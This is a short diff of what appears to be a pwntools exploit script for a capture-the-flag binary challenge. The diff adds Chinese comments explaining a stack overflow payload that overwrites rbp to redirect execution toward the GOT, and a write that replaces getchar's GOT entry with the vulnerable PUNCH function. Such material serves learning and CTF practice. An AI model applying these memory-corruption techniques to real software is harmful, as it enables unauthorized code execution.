@@ -25,9 +25,9 @@ p.sendline(b'2')
 p.recvuntil(b'[2] damage:\n')
 p.sendline(b'3')
 
-PUNCH(b'a'*0x10+p64(scanf_got+0x8)+p64(0x000000000040128B))
+PUNCH(b'a'*0x10+p64(scanf_got+0x8)+p64(0x000000000040128B))#覆盖rbp到got表，返回到那有两个scanf("%lld")的地方
 pause()
-scanf1(4198870)
+scanf1(4198870)#把getchar的got改成PUNCH函数（漏洞函数）
 pause()
 PUNCH(b'a'*0x10+p64(scanf_got+0x8)+p64(0x000000000040128B))
 pause()
